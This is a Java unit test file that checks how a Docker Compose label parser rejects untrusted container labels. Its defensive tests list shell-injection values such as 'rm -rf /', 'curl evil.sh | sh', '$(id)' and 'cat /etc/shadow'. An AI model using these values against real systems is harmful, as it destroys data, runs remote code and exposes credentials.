package net.vaier.domain;

import org.junit.jupiter.api.Test;

import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Optional;

import static org.assertj.core.api.Assertions.assertThat;

class ComposeCoordinatesTest {

    private static Map<String, String> labels(String project, String service, String configFiles,
                                              String workingDir) {
        Map<String, String> labels = new HashMap<>();
        if (project != null) labels.put("com.docker.compose.project", project);
        if (service != null) labels.put("com.docker.compose.service", service);
        if (configFiles != null) labels.put("com.docker.compose.project.config_files", configFiles);
        if (workingDir != null) labels.put("com.docker.compose.project.working_dir", workingDir);
        return labels;
    }

    private static Map<String, String> pihole() {
        return labels("pihole", "pihole", "/home/ubuntu/pihole/docker-compose.yml", "/home/ubuntu/pihole");
    }

    @Test
    void fromLabels_readsHowComposeStartedTheContainer() {
        ComposeCoordinates coordinates = ComposeCoordinates.fromLabels(pihole()).orElseThrow();

        assertThat(coordinates.project()).isEqualTo("pihole");
        assertThat(coordinates.service()).isEqualTo("pihole");
        assertThat(coordinates.configFiles()).containsExactly("/home/ubuntu/pihole/docker-compose.yml");
        assertThat(coordinates.workingDir()).isEqualTo("/home/ubuntu/pihole");
    }

    @Test
    void fromLabels_keepsEveryConfigFileOfAMultiFileProject() {
        // Compose invoked with several -f files records all of them, comma-separated. Keeping only the
        // first would recreate the service from half its definition — an override file silently dropped.
        ComposeCoordinates coordinates = ComposeCoordinates.fromLabels(labels("stack", "web",
            "/srv/stack/docker-compose.yml,/srv/stack/docker-compose.override.yml", "/srv/stack"))
            .orElseThrow();

        assertThat(coordinates.configFiles()).containsExactly(
            "/srv/stack/docker-compose.yml", "/srv/stack/docker-compose.override.yml");
    }

    @Test
    void fromLabels_toleratesWhitespaceAroundTheConfigFileSeparator() {
        ComposeCoordinates coordinates = ComposeCoordinates.fromLabels(labels("stack", "web",
            "/srv/stack/docker-compose.yml, /srv/stack/override.yml", "/srv/stack")).orElseThrow();

        assertThat(coordinates.configFiles()).containsExactly(
            "/srv/stack/docker-compose.yml", "/srv/stack/override.yml");
    }

    @Test
    void fromLabels_isEmptyForAContainerStartedWithPlainDockerRun() {
        // No compose labels at all — Vaier does not know how it was started.
        assertThat(ComposeCoordinates.fromLabels(Map.of())).isEmpty();
        assertThat(ComposeCoordinates.fromLabels(null)).isEmpty();
        assertThat(ComposeCoordinates.fromLabels(Map.of("org.opencontainers.image.version", "1.2.3"))).isEmpty();
    }

    @Test
    void fromLabels_isEmptyWhenAnyCoordinateIsMissing() {
        assertThat(ComposeCoordinates.fromLabels(labels(null, "pihole", "/a/docker-compose.yml", "/a"))).isEmpty();
        assertThat(ComposeCoordinates.fromLabels(labels("pihole", null, "/a/docker-compose.yml", "/a"))).isEmpty();
        // Without the config files there is no -f to recreate the service with.
        assertThat(ComposeCoordinates.fromLabels(labels("pihole", "pihole", null, "/a"))).isEmpty();
    }

    @Test
    void fromLabels_isEmptyWhenACoordinateIsBlank() {
        assertThat(ComposeCoordinates.fromLabels(labels("  ", "pihole", "/a/docker-compose.yml", "/a"))).isEmpty();
        assertThat(ComposeCoordinates.fromLabels(labels("pihole", "", "/a/docker-compose.yml", "/a"))).isEmpty();
        assertThat(ComposeCoordinates.fromLabels(labels("pihole", "pihole", "   ", "/a"))).isEmpty();
    }

    @Test
    void fromLabels_worksWithoutAWorkingDirectory() {
        // The config files carry the whole address of the project; the working directory is a nicety.
        ComposeCoordinates coordinates = ComposeCoordinates
            .fromLabels(labels("pihole", "pihole", "/home/ubuntu/pihole/docker-compose.yml", null))
            .orElseThrow();

        assertThat(coordinates.workingDir()).isNull();
    }

    // --- Labels are metadata a container sets about ITSELF: untrusted input ---

    @Test
    void fromLabels_refusesAProjectNameCarryingShellMetacharacters() {
        for (String hostile : List.of("pihole; rm -rf /", "pihole && curl evil.sh | sh", "$(id)", "`id`",
                                      "pi|hole", "pi hole", "pihole\nrm -rf /", "pi\0hole")) {
            assertThat(ComposeCoordinates.fromLabels(
                labels(hostile, "pihole", "/home/ubuntu/pihole/docker-compose.yml", "/home/ubuntu/pihole")))
                .as("project %s", hostile)
                .isEmpty();
        }
    }

    @Test
    void fromLabels_refusesAServiceNameCarryingShellMetacharacters() {
        for (String hostile : List.of("web; reboot", "web$(id)", "we`id`b", "web|cat /etc/shadow", "web\rboot")) {
            assertThat(ComposeCoordinates.fromLabels(
                labels("pihole", hostile, "/home/ubuntu/pihole/docker-compose.yml", "/home/ubuntu/pihole")))
                .as("service %s", hostile)
                .isEmpty();
        }
    }

    @Test
    void fromLabels_refusesAConfigFilePathThatIsNotAbsolute() {
        assertThat(ComposeCoordinates.fromLabels(labels("pihole", "pihole", "docker-compose.yml", "/a"))).isEmpty();
        assertThat(ComposeCoordinates.fromLabels(
            labels("pihole", "pihole", "/a/docker-compose.yml,relative.yml", "/a"))).isEmpty();
    }

    @Test
    void fromLabels_refusesAPathCarryingANewlineCarriageReturnOrNul() {
        for (String hostile : List.of("/a/docker-compose.yml\nrm -rf /", "/a/docker-compose.yml\rreboot",
                                      "/a/docker-compose.yml\0evil")) {
            assertThat(ComposeCoordinates.fromLabels(labels("pihole", "pihole", hostile, "/a")))
                .as("config files %s", hostile)
                .isEmpty();
        }
    }

    @Test
    void fromLabels_refusesAPathCarryingAnythingAShellWouldReadAsSyntax() {
        // Stricter than "no control characters" on purpose: quoting the path at the command edge is the
        // other half of this, and neither half should be the only thing standing between a label and a
        // shell. A space is deliberately still allowed — a directory with one in it is somebody's setup.
        for (String hostile : List.of("/srv/app;rm -rf /", "/srv/$(id)/docker-compose.yml",
                                      "/srv/`id`/docker-compose.yml", "/srv/app|sh", "/srv/app&&reboot",
                                      "/srv/app>/etc/passwd", "/srv/app\"quoted\".yml")) {
            assertThat(ComposeCoordinates.fromLabels(labels("pihole", "pihole", hostile, "/a")))
                .as("config files %s", hostile)
                .isEmpty();
        }
        assertThat(ComposeCoordinates.fromLabels(
            labels("pihole", "pihole", "/srv/my projects/docker-compose.yml", "/srv/my projects")))
            .isPresent();
    }

    @Test
    void fromLabels_refusesAHostileWorkingDirectoryRatherThanDroppingIt() {
        assertThat(ComposeCoordinates.fromLabels(
            labels("pihole", "pihole", "/a/docker-compose.yml", "relative/dir"))).isEmpty();
        assertThat(ComposeCoordinates.fromLabels(
            labels("pihole", "pihole", "/a/docker-compose.yml", "/a\nrm -rf /"))).isEmpty();
    }

    @Test
    void fromLabels_refusesAnEmptyEntryInTheConfigFileList() {
        // A trailing or doubled comma is not something compose writes; treat it as tampering.
        Optional<ComposeCoordinates> coordinates = ComposeCoordinates.fromLabels(
            labels("pihole", "pihole", "/a/docker-compose.yml,", "/a"));

        assertThat(coordinates).isEmpty();
    }
}
